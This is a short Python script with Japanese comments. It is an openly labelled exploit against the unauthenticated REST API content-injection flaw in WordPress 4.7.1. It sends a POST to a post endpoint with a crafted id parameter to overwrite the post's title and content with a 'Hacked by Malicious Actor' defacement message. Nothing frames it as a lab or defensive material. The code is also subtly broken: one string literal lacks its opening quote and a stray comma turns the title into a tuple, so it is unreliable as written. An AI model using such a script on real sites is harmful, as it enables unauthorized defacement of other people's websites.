import requests

# WordPressのURLと攻撃対象の投稿ID
rest_api_url = http://[マシンのIPアドレス]:8080/wp-json/wp/v2/posts/[記事のID]?id=[記事のID]'  # 攻撃用URL

# WordPressのログイン情報は不要。書き換えたい記事の内容
title = 'Hacked by Malicious Actor',
content = 'This post has been compromised by a vulnerability in WordPress 4.7.1 REST API.'

# 認証せずに、投稿を更新する
update_data = {
    'title': title,
    'content': content
}

# 攻撃リクエストを送信
response = requests.post(rest_api_url, json=update_data)

# レスポンス確認
print("Status code: ", response.status_code)
if response.status_code == 200:
    print("Post successfully modified!")
    print(response.json())
else:
    print("Failed to modify the post.")

